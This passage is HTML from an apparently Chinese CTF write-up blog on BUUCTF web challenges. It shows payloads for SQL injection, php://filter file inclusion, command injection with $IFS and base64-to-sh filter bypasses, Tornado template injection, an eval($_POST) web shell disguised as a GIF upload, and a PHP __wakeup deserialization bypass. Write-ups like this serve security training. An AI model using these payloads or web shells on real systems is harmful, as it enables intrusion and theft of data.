+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>*<code>查询法</code></li>
+<li><code>操作符重置法</code></li>
+</ul>
+<h2 id="过程-4"><a href="#过程-4" class="headerlink" title="过程"></a>过程</h2><p>主页：</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210622204025.png"></p>
+<p>输入参数1</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210622204059.png"></p>
+<blockquote>
+<p>order by查询字段</p>
+</blockquote>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210622204228.png"></p>
+<p>经过一番测试，发现过滤了<code>order by、select</code>等，双写，大小写也无法绕过</p>
+<blockquote>
+<p>堆叠查询</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">1;show databases;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>结果：</p>
+<pre class="line-numbers language-none"><code class="language-none">Array
+(
+    [0] =&gt; 1
+)
+Array
+(
+    [0] =&gt; ctf
+)
+Array
+(
+    [0] =&gt; ctftraining
+)
+Array
+(
+    [0] =&gt; information_schema
+)
+Array
+(
+    [0] =&gt; mysql
+)
+Array
+(
+    [0] =&gt; performance_schema
+)
+Array
+(
+    [0] =&gt; test
+)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">1;show tables;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>结果：</p>
+<pre class="line-numbers language-none"><code class="language-none">Array
+(
+    [0] =&gt; 1
+)
+Array
+(
+    [0] =&gt; Flag
+)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h3><blockquote>
+<p>*查询法</p>
+</blockquote>
+<p>查询语句：</p>
+<pre class="line-numbers language-none"><code class="language-none">select *,1||flag from Flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在本地测试一番：</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210622210321.png"></p>
+<p>payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">*,1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a>方法二</h3><blockquote>
+<p>操作符重置法</p>
+</blockquote>
+<p>查询语句：</p>
+<pre class="line-numbers language-none"><code class="language-none">select 1;set sql_mode=PIPES_AS_CONCAT;select 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>使用<code>set sql_mode=PIPES_AS_CONCAT;</code>将||视为字符串的连接操作符而非或运算符。</p>
+<p>payload:</p>
+<pre class="line-numbers language-none"><code class="language-none">1;set sql_mode=PIPES_AS_CONCAT;select 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><h2 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>php://filter 伪协议文件包含读取源代码，加上read=convert.base64-encode，用base64编码输出，不然会直接当做php代码执行，看不到源代码内容。</li>
+</ul>
+<h2 id="过程-5"><a href="#过程-5" class="headerlink" title="过程"></a>过程</h2><p>主页：</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210622212914.png"></p>
+<p>有个<code>get</code>型的参数，可以看到传入flag.php，这里是一个文件包含，但是无法查看php脚本的详细内容</p>
+<p>payload</p>
+<pre class="line-numbers language-none"><code class="language-none">?file=php://filter/read=convert.base64-encode/resource=flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210622213359.png"></p>
+<h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><h2 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>php://filter 伪协议文件包含读取源代码，加上read=convert.base64-encode，用base64编码输出，不然会直接当做php代码执行，看不到源代码内容。</li>
+</ul>
+<h2 id="过程-6"><a href="#过程-6" class="headerlink" title="过程"></a>过程</h2><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210625114703.png"></p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210625115544.png"></p>
+<p>源代码出现<code>Archive_room.php</code>，点击跳转到这个页面</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210625115623.png"></p>
+<p>再点select继续跳转到这个页面，查看源代码没发现什么特别的</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210625115649.png"></p>
+<p>使用burpsuite抓下包</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210625115827.png"></p>
+<p>发现<code>secr3t.php</code>，访问得到源码</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;
+    &lt;title&gt;secret&lt;/title&gt;
+    &lt;meta charset="UTF-8"&gt;
+&lt;?php
+    highlight_file(__FILE__);
+    error_reporting(0);
+    $file=$_GET['file'];
+    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
+        echo "Oh no!";
+        exit();
+    }
+    include($file); 
+//flag放在了flag.php里
+?&gt;
+&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看到是文件包含，传入一个get型参数<code>file</code>，首先判断if语句中不允许存在<code>../</code>，<code>tp</code>，<code>data</code></p>
+<pre class="line-numbers language-none"><code class="language-none">?file=php://filter/read=convert.base64-encode/resource=flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210625120412.png"></p>
+<p>得到加密后内容，解码得到flag</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210625120510.png"></p>
+<h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><h2 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>命令执行</li>
+</ul>
+<h2 id="过程-7"><a href="#过程-7" class="headerlink" title="过程"></a>过程</h2><p>主页面：</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210625141806.png"></p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210625141944.png"></p>
+<p>这里是存在命令<code>执行漏洞</code>的，我们尝试去使用<code>；</code>执行命令</p>
+<pre class="line-numbers language-none"><code class="language-none">127.0.0.1;cat /flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210625143006.png"></p>
+<h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><h2 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>常规union select注入</li>
+</ul>
+<h2 id="过程-8"><a href="#过程-8" class="headerlink" title="过程"></a>过程</h2><p>主页：</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210627205821.png"></p>
+<p>抓包分析下</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210627205935.png"></p>
+<p>手动测试下注入点</p>
+<blockquote>
+<p>order by查下字段</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">admin' order by 3#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210627210356.png"></p>
+<blockquote>
+<p>union select寻找显示位</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">-admin' union select 1,2,3%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210627210541.png"></p>
+<blockquote>
+<p>查表</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">-admin' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210627210907.png"></p>
+<p>发现<code>geekuser</code>,<code>l0ve1ysq1</code>两张表</p>
+<blockquote>
+<p>在l0ve1ysq1中查下字段</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">-admin' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1'),3%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210627211114.png"></p>
+<blockquote>
+<p>dump数据</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">-admin' union select 1,(select group_concat(id,username,password) from l0ve1ysq1),3%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210627211308.png"></p>
+<p>得到flag</p>
+<h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><h2 id="知识点-9"><a href="#知识点-9" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li><p>变量拼接</p>
+</li>
+<li><p>sh，bash下编码</p>
+</li>
+<li><p>绕过空格过滤</p>
+</li>
+<li><p>绕过关键字过滤</p>
+</li>
+</ul>
+<h2 id="过程-9"><a href="#过程-9" class="headerlink" title="过程"></a>过程</h2><p>主页：</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210627211908.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">?ip=127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210627211937.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">?ip=127.0.0.1;ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210627212028.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">?ip=127.0.0.1;cat flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210627212229.png"></p>
+<p>过滤了空格，使用<code>$IFS$1</code>来绕过</p>
+<pre class="line-numbers language-none"><code class="language-none">?ip=127.0.0.1;cat$IFS$1flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210627212341.png"></p>
+<p>过滤了<code>flag</code>，但是可以查看下index.php</p>
+<pre class="line-numbers language-none"><code class="language-none">?ip=127.0.0.1;cat$IFS$1index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
+    echo preg_match("/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
+    die("fxck your symbol!");
+  } else if(preg_match("/ /", $ip)){
+    die("fxck your space!");
+  } else if(preg_match("/bash/", $ip)){
+    die("fxck your bash!");
+  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
+    die("fxck your flag!");
+  }
+  $a = shell_exec("ping -c 4 ".$ip);
+  echo "
+";
+  print_r($a);
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="方法一-2"><a href="#方法一-2" class="headerlink" title="方法一"></a>方法一</h3><blockquote>
+<p>变量拼接</p>
+</blockquote>
+<p>可以使用变量拼接的方式绕过<code>flag</code>过滤</p>
+<pre class="line-numbers language-none"><code class="language-none">?ip=127.0.0.1;a=f;d=ag;c=l;cat$IFS$a$c$d.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>ps: 参数顺序要注意，adc换位acdflag会被检测出来：）</strong></p>
+<p>过滤了<code>?/\{}()[]*</code> 否则bash语法可以用“？”，正斜杠“/”，数字和字母来执行系统命令。</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210627213653.png"></p>
+<h3 id="方法二-2"><a href="#方法二-2" class="headerlink" title="方法二"></a>方法二</h3><blockquote>
+<p>sh，bash下编码</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h2><pre class="line-numbers language-none"><code class="language-none">$IFS
+${IFS}
+$IFS$1 //$1改成$加其他数字貌似都行
+&lt; //cat&lt;a.txt
+&lt;&gt;  
+{cat,flag.php}  //用逗号实现了空格功能
+%20 (space)
+%09 (tab)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="绕过关键字过滤"><a href="#绕过关键字过滤" class="headerlink" title="绕过关键字过滤"></a>绕过关键字过滤</h2><h3 id="特殊变量"><a href="#特殊变量" class="headerlink" title="特殊变量"></a>特殊变量</h3><pre class="line-numbers language-none"><code class="language-none">$*
+$@
+$x    (x 代表 1-9)
+${x}   (x&gt;=10)
+在没有传参的情况下，上面的特殊变量都是为空的 ca${21}t a.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="反斜杠"><a href="#反斜杠" class="headerlink" title="反斜杠"></a>反斜杠</h3><pre class="line-numbers language-none"><code class="language-none">ca\t a.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="变量替换"><a href="#变量替换" class="headerlink" title="变量替换"></a>变量替换</h3><pre class="line-numbers language-none"><code class="language-none">a=ca;b=t;c=a.txt;aaab $c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="引号"><a href="#引号" class="headerlink" title="引号"></a>引号</h3><pre class="line-numbers language-none"><code class="language-none">c'a't flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><h4 id="Base64-编码绕过"><a href="#Base64-编码绕过" class="headerlink" title="Base64 编码绕过"></a>Base64 编码绕过</h4><pre class="line-numbers language-none"><code class="language-none">root@kali:~/# echo 'cat a.txt'| base64 Y2F0IGEudHh0Cg==
+root@kali:~/# echo 'Y2F0IGEudHh0Cg==' | base64 -d abc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h4 id="十六进制编码绕过"><a href="#十六进制编码绕过" class="headerlink" title="十六进制编码绕过"></a>十六进制编码绕过</h4><pre class="line-numbers language-none"><code class="language-none">root@kali:~/# echo 'cat a.txt' | xxd -p 63617420612e7478740a
+root@kali:~/# echo '0x63617420612e7478740a'| xxd -r -p Abc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h4 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h4><pre class="line-numbers language-none"><code class="language-none">? 
+*
+[…]：匹配范围中任何一个字符 cat fl[abc]g.php
+[a-z]：匹配 a-z 范围中任何一个字符 cat fl[a-z]g.php
+{a,b}：对以逗号分割的文件列表进行拓展 cat fl{b,c}g.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="命令分隔与执行多条命令"><a href="#命令分隔与执行多条命令" class="headerlink" title="命令分隔与执行多条命令"></a>命令分隔与执行多条命令</h4><pre class="line-numbers language-none"><code class="language-none">1.&amp;
+&amp; 表示将任务置于后台执行
+2.&amp;&amp;
+只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才 会被执行。
+3.|
+| 表示管道，上一条命令的输出，作为下一条命令的参数
+4.||
+只有在 || 左边的命令返回假（命令返回值 $? == 1），|| 右边的命令才 会被执行。
+5.；
+多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h1><h2 id="知识点-10"><a href="#知识点-10" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>蚁剑或者中国菜刀等工具的使用</li>
+</ul>
+<h2 id="过程-10"><a href="#过程-10" class="headerlink" title="过程"></a>过程</h2><blockquote>
+<p>主页：</p>
+</blockquote>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210628212304.png"></p>
+<p>直接给出这个主页就是一句话木马</p>
+<p>蚁剑连接，根目录查看到flag</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210628212356.png"></p>
+<h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><h2 id="知识点-11"><a href="#知识点-11" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li><p>X-Forwarded-For</p>
+</li>
+<li><p>referer</p>
+</li>
+<li><p>UA的修改</p>
+</li>
+</ul>
+<h2 id="过程-11"><a href="#过程-11" class="headerlink" title="过程"></a>过程</h2><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210628212952.png"></p>
+<p>直接发现Secret.php</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210628213031.png"></p>
+<p>请求头中添加<code>referer</code></p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210628213136.png"></p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210628213155.png"></p>
+<p>修改<code>user-agent</code></p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210628213230.png"></p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210628213244.png"></p>
+<p>添加<code>X-Forwarded-For</code></p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210628213346.png"></p>
+<p>得到flag</p>
+<h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><h2 id="知识点-12"><a href="#知识点-12" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>scandir</li>
+<li>传入参数名前面添加空格绕过waf</li>
+</ul>
+<h2 id="过程-12"><a href="#过程-12" class="headerlink" title="过程"></a>过程</h2><p>主页：</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210629212925.png"></p>
+<p>随便输入个数字，比如<code>1</code>测试下抓包</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210629213118.png"></p>
+<p>通过查阅大佬的博客，这里可以使用<code>scandir('/')</code>，先扫下目录</p>
+<pre class="line-numbers language-none"><code class="language-none">/calc.php? num=1;var_dump(scandir('/'))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>此条payload中我们在num前面添加一个空格，也就是“ num”,添加空格的目的是假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。（来自大佬的解释），继续测试，发现应该是过滤了 <code>\</code>，chr转换下</p>
+<pre class="line-numbers language-none"><code class="language-none">/calc.php? num=1;var_dump(scandir(chr(47)))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210629215725.png"></p>
+<p>发现<code>flagg</code>文件，然后使用<code>file_get_contents</code>读取文件内容，同样采取chr()的方式，然后再拼接起来</p>
+<pre class="line-numbers language-none"><code class="language-none">/calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210629220043.png"></p>
+<h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><h2 id="知识点-13"><a href="#知识点-13" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>Python模板注入（ssti）</li>
+</ul>
+<h2 id="过程-13"><a href="#过程-13" class="headerlink" title="过程"></a>过程</h2><p>根据题目名称tornado，搜索一番，发现tornado是一个Python的模板</p>
+<p>welcome.txt提示render,经过查询render是python中的一个渲染函数，渲染变量到模板中，即可以通过传递不同的参数形成不同的页面。</p>
+<p>主页：</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210703163759.png"></p>
+<p>三个文件中分别提示的内容为</p>
+<ul>
+<li>flag in /fllllllllllllag</li>
+<li>render</li>
+<li>md5(cookie_secret+md5(filename))</li>
+</ul>
+<p>然后抓个包</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210703163938.png"></p>
+<p>不难发现，在file文件下，传入了两个get型的参数，filename和filehash，为了得到flag，filename肯定传入/fllllllllllllag，而filehash需要根据md5(cookie_secret+md5(filename))找出对应的cookie_secret，所以我们重点是放在**找<code>cookie_secret</code>**上</p>
+<p>修改请求行中的filename，发现提示</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210712104918.png"></p>
+<p>访问提示页面/error?msg=Error</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210712105528.png"></p>
+<p>存在模板注入，之后进行各种尝试与资料获取发现对于tornado框架存在附属文件handler.settings,于是尝试输入<code>/error?msg={{handler.settings}}</code></p>
+<p>发现 ‘cookie_secret’:</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210712105649.png"></p>
+<p>计算filehash值</p>
+<pre class="line-numbers language-none"><code class="language-none">import hashlibm
+
+hash = hashlib.md5()
+
+filename='/fllllllllllllag'
+cookie_secret="3799aef2-cdfe-4c5d-ae04-47b3723689a0"
+hash.update(filename.encode('utf-8'))
+s1=hash.hexdigest()
+hash = hashlib.md5()
+hash.update((cookie_secret+s1).encode('utf-8'))
+print(hash.hexdigest())<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210712110251.png"></p>
+<p>url传入</p>
+<pre class="line-numbers language-none"><code class="language-none">/file?filename=/fllllllllllllag&amp;filehash=7828f14055747177adf201166beddeda<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210712110402.png"></p>
+<h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><h2 id="知识点-14"><a href="#知识点-14" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>上传phtml文件</li>
+<li>嵌在script标签中的一句话木马</li>
+<li>content-type的修改</li>
+<li>请求体中的添加文件头</li>
+</ul>
+<h2 id="过程-14"><a href="#过程-14" class="headerlink" title="过程"></a>过程</h2><p>主页就是上传点，先上传一个正常的shell.php文件</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210712150743.png"></p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210712150731.png"></p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210712150829.png"></p>
+<p>发现只能上传image，bp抓包依次尝试文件后缀名修改，content-type修改、文件名%00截断，添加文件头都失败</p>
+<p>然后更改文件名为xx.phtml,，phtml是嵌入了php代码的html文件，尝试上传，请求体中的内容仍然是普通的一句话木马文件</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210712151252.png"></p>
+<p>检测到<code>&lt;?</code>请求体中的内容需要更改为：</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;script language="php"&gt;eval($_POST['shell']);&lt;/script&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>仍然不行，所以修改继续在请求头中添加一项</p>
+<pre class="line-numbers language-none"><code class="language-none">GIF89a
+&lt;script language="php"&gt;eval($_POST['shell']);&lt;/script&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210712151704.png"></p>
+<p>上传成功，用后门软件连接即可，链接地址经过测试在：</p>
+<pre class="line-numbers language-none"><code class="language-none">http://eb74e5c1-2c38-4013-8035-e32ba42d81a4.node4.buuoj.cn/upload/shell.phtml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210712151942.png"></p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210712152026.png"></p>
+<h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><h2 id="知识点-15"><a href="#知识点-15" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>备份文件泄露</li>
+<li>反序列漏洞</li>
+</ul>
+<h2 id="过程-15"><a href="#过程-15" class="headerlink" title="过程"></a>过程</h2><p>主页：（提示我们存在备份文件），扫一下常见备份目录</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210714094451.png"></p>
+<p>发现<code>www.zip</code>，打开源码，在<code>index.php</code>发现有个存在反序列化漏洞</p>
+<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210714094935.png"></p>
+<p>然后在<code>class.php</code>中可以看到，如果满足两个条件：</p>
+<ul>
+<li>password的值等于<code>100</code></li>
+<li>username的值等于<code>admin</code></li>
+</ul>
+<p>即可输出flag，但是如何让username的值为admin呢？由于wakeup方法会导致username成为guest，因此需要通过序列化字符串中对象的个数来绕过该方法。</p>
+<blockquote>
+<p>跳过__wakeup()</p>
+</blockquote>
+<p>在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行</p>
+<p>因此我们将序列化这样设置</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Name"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Nameusername"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Namepassword"</span><span class="token punctuation">;</span><span class="token argument-name">i</span><span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>不过还是没有结束，因为这个声明变量是private</p>
+<blockquote>
+<p>private</p>
+</blockquote>
